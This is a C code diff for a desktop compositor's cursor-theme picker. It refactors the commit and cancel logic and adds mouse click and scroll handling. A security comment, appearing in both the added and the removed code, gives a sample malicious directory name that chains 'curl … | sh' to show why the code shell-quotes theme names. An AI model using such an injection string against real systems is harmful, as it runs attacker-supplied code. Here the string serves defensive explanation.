@@ -380,6 +380,126 @@ void curpick_toggle(syn_server_t *s)
     else                    curpick_show(s);
 }
 
+/* Commit the highlighted theme: persist it so the choice survives a restart,
+ * and hand the rest of the desktop (GTK, Qt, Xwayland) to the helper, which
+ * knows all the places a cursor theme has to be written.
+ *
+ * A function rather than a case body because the pointer commits too, and the
+ * shell-quoting below is exactly the kind of code that must not exist twice.
+ */
+static void curpick_commit(syn_server_t *s)
+{
+    cursor_state_save(s);
+
+    /* THE NAME IS UNTRUSTED. It is a directory name, and directories get
+     * here by being unpacked from an archive off the internet. synui's
+     * spawn() runs /bin/sh -c, so a theme directory called
+     *   evil; curl http://…​ | sh
+     * would execute the moment it was selected. Quote it properly instead
+     * of interpolating: single quotes make the shell take every byte
+     * literally, and the '\'' dance is the only way to carry a literal
+     * single quote through them. */
+    char q[sizeof(s->config.cursor_theme) * 4 + 32];
+    size_t qi = 0;
+    const char *nm = s->config.cursor_theme;
+    q[qi++] = '\'';
+    for (size_t i = 0; nm[i] && qi + 8 < sizeof(q); i++) {
+        if (nm[i] == '\'') {
+            /* close, escaped quote, reopen */
+            q[qi++] = '\''; q[qi++] = '\\'; q[qi++] = '\''; q[qi++] = '\'';
+        } else {
+            q[qi++] = nm[i];
+        }
+    }
+    q[qi++] = '\'';
+    q[qi]   = '\0';
+
+    char cmd[sizeof(q) + 32];
+    snprintf(cmd, sizeof(cmd), "synui-cursor set %s", q);
+    synui_spawn(cmd);
+
+    curpick_hide(s);
+}
+
+/* Back out to whatever was active when the panel opened — Esc, and any click
+ * off the panel. Arrowing onto an unreadable cursor is otherwise a trap. */
+static void curpick_cancel(syn_server_t *s)
+{
+    if (strcmp(s->curpick.restore_theme, s->config.cursor_theme) != 0) {
+        snprintf(s->config.cursor_theme, sizeof(s->config.cursor_theme),
+                 "%s", s->curpick.restore_theme);
+        cursor_apply(s);
+    }
+    curpick_hide(s);
+}
+
+/* ── Pointer ─────────────────────────────────────────────────
+ *
+ * See the panel pointer contract in synui.h, and wppick.c, which this mirrors:
+ * one click previews the theme (the arrow keys' job), a double click commits it
+ * (Enter's). Same 400ms window, and a click off the panel is Esc — it puts back
+ * the theme that was active when the panel opened. */
+
+int curpick_motion(syn_server_t *s, double lx, double ly)
+{
+    (void)lx; (void)ly;
+    /* No hover preview, as in wppick: moving the selection here swaps the live
+     * cursor theme, and doing that to every row the pointer crosses would make
+     * the cursor flicker through sixty themes on the way down the list. */
+    return s->curpick.visible ? 1 : 0;
+}
+
+int curpick_click(syn_server_t *s, double lx, double ly, uint32_t button,
+                  uint32_t time_msec)
+{
+    if (!s->curpick.visible) return 0;
+
+    if (!hit_in_panel(&s->curpick.hit, lx, ly)) {
+        curpick_cancel(s);
+        return 1;
+    }
+
+    if (button != BTN_LEFT) return 1;
+
+    int i = hit_index_at(&s->curpick.hit, lx, ly);
+    if (i < 0 || i >= curpick_total(s)) return 1;   /* chrome */
+
+    bool dbl = (s->curpick.last_click_row == i) &&
+               (time_msec - s->curpick.last_click_ms < 400);
+    s->curpick.last_click_row = dbl ? -1 : i;
+    s->curpick.last_click_ms  = time_msec;
+
+    if (dbl) {
+        curpick_commit(s);
+        return 1;
+    }
+
+    s->curpick.selected = i;
+    curpick_apply(s, i);              /* live preview, as Up/Down do */
+    curpick_scroll_to_selection(s);
+    synui_render_curpick(s);
+    return 1;
+}
+
+int curpick_scroll(syn_server_t *s, double lx, double ly, double delta)
+{
+    (void)lx; (void)ly;
+    if (!s->curpick.visible) return 0;
+    if (delta == 0) return 1;
+
+    /* Scrolls the window, not the selection — moving the selection applies a
+     * theme, and a wheel must not do that per notch. Same call wppick makes. */
+    int total = curpick_total(s);
+    if (total <= CURPICK_ROWS) return 1;
+
+    s->curpick.scroll += delta > 0 ? 3 : -3;
+    if (s->curpick.scroll > total - CURPICK_ROWS)
+        s->curpick.scroll = total - CURPICK_ROWS;
+    if (s->curpick.scroll < 0) s->curpick.scroll = 0;
+    synui_render_curpick(s);
+    return 1;
+}
+
 int curpick_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
 {
     if (!s->curpick.visible) return 0;
@@ -391,52 +511,13 @@ int curpick_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
 
     switch (sym) {
     case XKB_KEY_Return:
-    case XKB_KEY_KP_Enter: {
-        /* Commit: persist so the choice survives a restart, and hand the rest
-         * of the desktop (GTK, Qt, Xwayland) to the helper, which knows all the
-         * places a cursor theme has to be written. */
-        cursor_state_save(s);
-
-        /* THE NAME IS UNTRUSTED. It is a directory name, and directories get
-         * here by being unpacked from an archive off the internet. synui's
-         * spawn() runs /bin/sh -c, so a theme directory called
-         *   evil; curl http://…​ | sh
-         * would execute the moment it was selected. Quote it properly instead
-         * of interpolating: single quotes make the shell take every byte
-         * literally, and the '\'' dance is the only way to carry a literal
-         * single quote through them. */
-        char q[sizeof(s->config.cursor_theme) * 4 + 32];
-        size_t qi = 0;
-        const char *nm = s->config.cursor_theme;
-        q[qi++] = '\'';
-        for (size_t i = 0; nm[i] && qi + 8 < sizeof(q); i++) {
-            if (nm[i] == '\'') {
-                /* close, escaped quote, reopen */
-                q[qi++] = '\''; q[qi++] = '\\'; q[qi++] = '\''; q[qi++] = '\'';
-            } else {
-                q[qi++] = nm[i];
-            }
-        }
-        q[qi++] = '\'';
-        q[qi]   = '\0';
-
-        char cmd[sizeof(q) + 32];
-        snprintf(cmd, sizeof(cmd), "synui-cursor set %s", q);
-        synui_spawn(cmd);
-
-        curpick_hide(s);
+    case XKB_KEY_KP_Enter:
+        curpick_commit(s);
         return 1;
-    }
 
     case XKB_KEY_Escape:
     case XKB_KEY_q:
-        /* Back out to whatever was active when the panel opened. */
-        if (strcmp(s->curpick.restore_theme, s->config.cursor_theme) != 0) {
-            snprintf(s->config.cursor_theme, sizeof(s->config.cursor_theme),
-                     "%s", s->curpick.restore_theme);
-            cursor_apply(s);
-        }
-        curpick_hide(s);
+        curpick_cancel(s);
         return 1;
 
     case XKB_KEY_Up:
